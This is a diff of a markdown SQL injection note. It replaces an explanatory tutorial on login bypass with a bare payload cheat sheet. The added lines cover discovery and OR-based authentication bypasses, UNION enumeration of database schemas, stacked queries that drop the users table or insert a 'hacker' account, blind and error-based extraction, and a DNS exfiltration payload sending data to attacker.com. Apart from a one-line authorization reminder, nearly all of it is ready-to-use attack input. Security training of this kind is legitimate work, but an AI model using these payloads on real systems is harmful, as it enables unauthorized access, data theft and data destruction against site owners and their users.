@@ -1,130 +1,89 @@
-# SQL Injection: Subverting Query Logic
+# SQL Injection Commands
 
-## Introduction
-SQL injection allows attackers to modify the original query by injecting operators and using SQL comments to subvert the query's logic. A common example is bypassing web authentication.
+## Discovery Payloads
+```
+'                    # Test for syntax error (odd quotes)
+"                    # Test for syntax error
+#                    # Comment out rest of query
+-- -                 # Comment out rest of query
+;                    # Terminate statement
+)                    # Close parenthesis
+```
+
+## Authentication Bypass - OR Injection
+```
+' OR '1'='1          # Always true condition
+' OR 1=1-- -         # Always true with comment
+' OR 1=1#            # Always true with comment
+' OR 'x'='x          # Always true condition
+' OR 1=1 LIMIT 1--   # Return first user only
+') OR ('1'='1        # Close parenthesis then inject
+```
+
+## Comment Out Password Check
+```
+'-- -                # Comment out everything after username
+'#                   # Comment out everything after username
+'/*                   # Multi-line comment start
+```
+
+## UNION Based Injection
+```
+' UNION SELECT 1--   # Test number of columns
+' UNION SELECT 1,2-- # Find columns
+' UNION SELECT 1,2,3-- # Continue until no error
+```
+
+## Database Enumeration
+```
+' UNION SELECT @@version--      # Get database version
+' UNION SELECT database()--     # Get current database
+' UNION SELECT user()--         # Get current user
+' UNION SELECT schema_name FROM information_schema.schemata--  # List databases
+```
+
+## Table/Column Enumeration
+```
+' UNION SELECT table_name FROM information_schema.tables--     # List tables
+' UNION SELECT column_name FROM information_schema.columns--   # List columns
+' UNION SELECT table_name,column_name FROM information_schema.columns-- # Both
+```
+
+## Stacked Queries
+```
+'; DROP TABLE users--    # Drop table (if stacked queries supported)
+'; INSERT INTO users VALUES('hacker','pass')--  # Insert new user
+```
+
+## Time-Based Blind SQLi
+```
+' AND SLEEP(5)--         # Delay response by 5 seconds
+' OR SLEEP(5)--          # Sleep if condition true
+' AND IF(1=1,SLEEP(5),0)-- # Conditional delay
+```
+
+## Error-Based Injection
+```
+' AND extractvalue(1,concat(0x7e,version()))--  # Extract version via error
+' AND updatexml(1,concat(0x7e,user()),1)--      # Extract user via error
+```
+
+## Boolean Blind Injection
+```
+' AND 1=1--              # Returns true
+' AND 1=2--              # Returns false
+' AND SUBSTRING(version(),1,1)='8'--  # Check version character
+```
+
+## Out-of-Band (DNS) Injection
+```
+' UNION SELECT load_file(concat('\\\\',version(),'.attacker.com\\test'))--  # DNS exfil
+```
 
 ---
 
-## Authentication Bypass Basics
-
-### Original Query
-```sql
-SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
-```
-
-### Goal
-Log in as admin without knowing the password by making the query always return TRUE.
-
----
-
-## SQLi Discovery Payloads
-
-| Payload | URL Encoded | Purpose |
-|---------|-------------|---------|
-| `'` | `%27` | Test for syntax errors (odd number of quotes) |
-| `"` | `%22` | Test for syntax errors |
-| `#` | `%23` | Comment out remaining query |
-| `;` | `%3B` | Terminate statement and execute new one |
-| `)` | `%29` | Close parenthesis |
-
-**Note:** Use URL-encoded versions for GET requests.
-
-### Testing with Single Quote
-```
-Username: ' 
-Password: something
-```
-
-**Result:** SQL syntax error occurs because the query becomes:
-```sql
-SELECT * FROM logins WHERE username=''' AND password='something';
-```
-
----
-
-## OR Injection Technique
-
-### Important Concept
-- **AND** operator is evaluated **before OR** (precedence)
-- If at least one OR condition is TRUE, the entire query returns TRUE
-
-### Common Payload
-```sql
-admin' or '1'='1
-```
-
-### How It Works
-The injected query becomes:
-```sql
-SELECT * FROM logins WHERE username='admin' or '1'='1' AND password='something';
-```
-
-**Logic Flow:**
-1. `'1'='1'` → TRUE
-2. `password='something'` → FALSE
-3. AND condition: TRUE AND FALSE → FALSE
-4. `username='admin'` → TRUE
-5. OR condition: TRUE OR FALSE → TRUE ✅
-
-### Successful Bypass
-```
-Username: admin' or '1'='1
-Password: anything
-```
-
----
-
-## Bypassing Without Known Username
-
-### Password Field Injection
-Try injecting OR condition in the password field:
-```
-Username: notAdmin
-Password: something' or '1'='1
-```
-
-### Final Query
-```sql
-SELECT * FROM logins WHERE username='notAdmin' OR '1'='1' AND password='something' OR '1'='1';
-```
-
-### Ultimate Simple Bypass
-```
-Username: ' or '1'='1
-Password: ' or '1'='1
-```
-
-**Result:** Returns first user in the table (often admin)
-
----
-
-## Key Takeaways
-
-1. **Always test with a single quote** to detect vulnerabilities
-2. **Use `OR` operators** to make conditions always TRUE
-3. **Pay attention to operator precedence** (AND before OR)
-4. **The `'1'='1'` condition** always returns TRUE
-5. **Comment out** the rest of the query when needed with `#` or `--`
-6. **Multiple bypass payloads exist** - test variations
-
----
-
-## Additional Useful Payloads
-
-| Payload | Explanation |
-|---------|-------------|
-| `' or 1=1--` | Basic bypass with comment |
-| `admin'--` | Comment out password check |
-| `admin'#` | Alternative comment syntax |
-| `admin') or ('1'='1` | Close parenthesis first |
-| `' or '1'='1' or '1'='1` | Multiple OR conditions |
-| `admin' or 1=1#` | Numeric true condition |
-
----
-
-## Important Notes
-
-- **Always use URL encoding** for GET requests
-- **Test variations** of payloads for different SQL dialects
-- **Different databases** may require different syntax
-- **Always test on authorized systems only**
+> 💡 **Tips:**
+> - Replace `'` with `"` if needed
+> - Use URL encoding (`%27` for `'`, `%23` for `#`) in GET requests
+> - Adjust syntax for different databases (MySQL, PostgreSQL, MSSQL, Oracle)
+> - Test on authorized systems only
